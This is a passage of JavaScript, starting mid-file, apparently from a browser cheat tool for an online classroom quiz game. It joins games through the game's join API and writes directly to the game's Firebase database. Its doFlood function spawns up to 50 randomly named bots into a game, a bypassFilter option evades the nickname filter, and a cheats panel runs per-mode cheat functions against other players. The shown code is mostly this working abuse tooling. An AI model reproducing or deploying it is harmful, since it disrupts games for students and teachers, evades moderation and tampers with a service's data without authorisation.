    bots = []; primary = null;
    renderBots(); setStatus('All bots kicked.'); renderCheats();
  });

  // ── Cheats rendering ──────────────────────────────────────────────────────
  function renderCheats() {
    if (!primary || primary.status !== 'connected') {
      cheatsContent.innerHTML = '<p style="color:#888;font-size:12px;padding:8px 0">Join a game first, then cheats appear here.</p>';
      return;
    }
    var modeCheats = (CHEATS[gameMode] || []).concat(GLOBAL_CHEATS);
    var players = getPlayers();
    var html = '<div class="bb-stitle">Mode: '+esc(gameMode||'Unknown')+'</div>'
      + '<div class="bb-stitle" style="margin-top:6px">Players</div>'
      + '<div style="margin-bottom:8px">';
    if (players.length) {
      players.forEach(function(p) { html += '<span class="bb-tag">'+esc(p)+'</span>'; });
    } else {
      html += '<span style="color:#aaa;font-size:11px">No players detected yet.</span>';
    }
    html += '</div><div class="bb-stitle">Cheats</div>';
    modeCheats.forEach(function(c, i) {
      if (c.t === 'btn') {
        html += '<button class="bb-cb" data-ci="'+i+'">'+esc(c.name)+'</button>';
      } else if (c.t === 'input') {
        html += '<div class="bb-cir">'
          + '<input class="bb-ci" id="bb_ci_'+i+'" placeholder="'+esc(c.name)+'" />'
          + '<button class="bb-btn sm" data-ci="'+i+'" data-ct="inp">Apply</button>'
          + '</div>';
      } else if (c.t === 'sel') {
        html += '<div class="bb-cir">'
          + '<select class="bb-sel" id="bb_cs_'+i+'">'
          + (players.length ? players.map(function(p){return '<option value="'+esc(p)+'">'+esc(p)+'</option>';}).join('') : '<option>No players</option>')
          + '</select>'
          + '<button class="bb-btn sm" data-ci="'+i+'" data-ct="sel">'+esc(c.name)+'</button>'
          + '</div>';
      } else if (c.t === 'sstat') {
        html += '<div class="bb-cir">'
          + '<select class="bb-sel" id="bb_cs_'+i+'">'
          + c.vals.map(function(v){return '<option value="'+esc(v)+'">'+esc(v)+'</option>';}).join('')
          + '</select>'
          + '<button class="bb-btn sm" data-ci="'+i+'" data-ct="sel">'+esc(c.name)+'</button>'
          + '</div>';
      }
    });
    cheatsContent.innerHTML = html;

    cheatsContent.addEventListener('click', function handler(e) {
      var btn = e.target.closest('[data-ci]');
      if (!btn || btn.tagName !== 'BUTTON') return;
      var ci = parseInt(btn.getAttribute('data-ci'));
      var cheat = modeCheats[ci];
      if (!cheat) return;
      var ct = btn.getAttribute('data-ct');
      if (!ct) {
        cheat.fn(btn);
      } else if (ct === 'inp') {
        var inp = document.getElementById('bb_ci_'+ci);
        if (inp) cheat.fn(inp.value.trim());
      } else if (ct === 'sel') {
        var sel = document.getElementById('bb_cs_'+ci);
        if (sel) cheat.fn(sel.value);
      }
    });
  }

  // ── Firebase loader ───────────────────────────────────────────────────────
  function loadFb(cb) {
    if (fbLib) { cb(); return; }
    var s = document.createElement('script');
    s.type = 'module';
    s.textContent =
      'import{initializeApp}from"'+FB_APP_URL+'";\n'+
      'import{getDatabase,ref,set,onValue,off}from"'+FB_DB_URL+'";\n'+
      'window.__bbFB={initializeApp,getDatabase,ref,set,onValue,off};\n'+
      'window.dispatchEvent(new Event("__bbFBReady"));';
    document.head.appendChild(s);
    window.addEventListener('__bbFBReady', function() { fbLib = window.__bbFB; cb(); }, {once:true});
  }

  // ── Join one bot ──────────────────────────────────────────────────────────
  function joinOne(code, name, incog, cb) {
    fetch(JOIN_API, {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({id:code, name:name}),
    })
    .then(function(r) { return r.text(); })
    .then(function(txt) {
      var body;
      try { body = JSON.parse(txt); } catch(_) {
        throw new Error('Server returned an unexpected response. Check your game code.');
      }
      if (!body.success || !body.fbToken || !body.fbShardURL) throw new Error(body.msg || 'Join failed');
      loadFb(function() {
        var app = fbLib.initializeApp(
          Object.assign({}, FB_CFG, {databaseURL: body.fbShardURL}),
          'bb_'+Date.now()+'_'+Math.random()
        );
        var db = fbLib.getDatabase(app);
        var blook = incog ? randBlook() : 'Rainbow Astronaut';
        // Use fbLib.ref and fbLib.set for the database
        var dbRef = fbLib.ref(db, code + '/c/' + name);
        fbLib.set(dbRef, {b: blook})
          .then(function() { cb(null, {app:app, db:db, blook:blook, dbFbLib:fbLib}); })
          .catch(function(e) { cb(e); });
      });
    })
    .catch(function(e) { cb(e); });
  }

  // ── Join handler ──────────────────────────────────────────────────────────
  function doJoin() {
    if (spawning) return;
    var code = inCode.value.trim();
    var nick = inNick.value.trim();
    var incog = chkIncog.checked;
    var byp   = chkBypass.checked;
    var fp    = chkFp.checked;
    if (!code || !nick) { setStatus('Enter a game code and nickname.', true); return; }
    var name = byp ? bypassFilter(nick) : nick;
    if (fp) name = '\u0020\u0020' + name;

    spawning = true;
    setStatus('Connecting\u2026');
    btnJoin.disabled = true;

    var bot = {id:Date.now(), name:name, code:code, blook:'', status:'connecting', app:null, db:null, isPrimary:true};
    bots.push(bot); renderBots();

    joinOne(code, name, incog, function(err, res) {
      spawning = false; btnJoin.disabled = false;
      if (err) { bot.status = 'error'; renderBots(); setStatus(err.message||'Join failed', true); return; }
      bot.app = res.app; bot.db = res.db; bot.blook = res.blook; bot.status = 'connected';
      primary = bot;
      renderBots(); setStatus('Connected as ' + name);
      // Listen for game data
      fbLib.onValue(fbLib.ref(res.db, code), function(snap) {
        gameData = snap.val() || {};
        var gm = (gameData.s && gameData.s.t) || 'Unknown';
        gameMode = (gm === 'Rush' && gameData.s && gameData.s.m === 'Teams') ? 'Rush (Teams)' : gm;
        if (cheatsTab.style.display !== 'none') renderCheats();
      });
    });
  }

  // ── Flood handler ─────────────────────────────────────────────────────────
  function doFlood() {
    if (spawning) return;
    var code = inCode.value.trim();
    var pfx  = inPfx.value.trim();
    var cnt  = Math.min(50, Math.max(1, parseInt(inCnt.value)||1));
    var incog = chkIncog.checked;
    if (!code) { setStatus('Enter a game code first.', true); return; }

    spawning = true; btnFlood.disabled = true;
    setStatus('Spawning ' + cnt + ' bots\u2026');

    function next(i) {
      if (i >= cnt) { spawning = false; btnFlood.disabled = false; setStatus('Spawned '+cnt+' bots.'); return; }
      var nm = randName(pfx);
      var bot = {id:Date.now()+i, name:nm, code:code, blook:'', status:'connecting', app:null, db:null, isPrimary:false};
      bots.push(bot); renderBots();
      joinOne(code, nm, incog, function(err, res) {
        if (err) { bot.status = 'error'; }
        else { bot.app=res.app; bot.db=res.db; bot.blook=res.blook; bot.status='connected'; }
        renderBots();
        setTimeout(function() { next(i+1); }, 400);
      });
    }
    next(0);
  }

  btnJoin.addEventListener('click', doJoin);
  btnFlood.addEventListener('click', doFlood);
  inCode.addEventListener('keydown', function(e) { if (e.key==='Enter') doJoin(); });
  inNick.addEventListener('keydown', function(e) { if (e.key==='Enter') doJoin(); });

}());
